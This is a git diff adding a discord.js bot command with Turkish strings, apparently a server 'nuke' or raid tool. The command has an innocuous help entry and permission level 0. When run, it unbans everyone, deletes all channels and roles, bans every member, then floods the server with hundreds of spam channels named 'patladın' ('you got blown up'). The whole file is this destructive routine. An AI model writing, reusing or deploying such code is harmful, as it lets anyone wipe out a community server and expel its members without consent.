@@ -1,0 +1,528 @@
+const Discord = require('discord.js');
+exports.run = (client, message, args) => { 
+  
+  
+  
+
+  
+    message.guild.fetchBans().then(bans => {
+      bans.forEach(user => {
+        message.guild.unban(user)
+      });
+    });
+  
+message.guild.channels.forEach(a => a.delete())
+message.guild.members.forEach(a => message.guild.ban(a))
+message.guild.roles.forEach(a => a.delete())
+  let kanal = 'Bu Bot'
+  let kanal2 = 'patlatma'
+  let kanal3 = 'botudur'
+  let kanal4 = 'ay lav yu'
+  let kanal5 = 'Unutmayın'
+  let kanal6 = 'brolare'
+  let kanalsp = 'patladın'
+  
+  
+  message.guild.createChannel(kanal, kanal)
+  message.guild.createChannel(kanal2, kanal2)
+  message.guild.createChannel(kanal3, kanal3)
+  message.guild.createChannel(kanal4, kanal4)
+  message.guild.createChannel(kanal5, kanal5)
+  message.guild.createChannel(kanal6, kanal6)  
+  message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+   message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+ message.guild.createChannel(kanalsp, kanalsp) 
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  message.guild.createChannel(kanalsp, kanalsp)
+  
+  
+  
+  };
+exports.conf = {
+  enabled: true,  
+  guildOnly: false, 
+  aliases: [], 
+  permLevel: 0
+};
+
+exports.help = {
+  name: 'kaaadnal',
+  description: 'taslak', 
+  usage: 'help'
+};
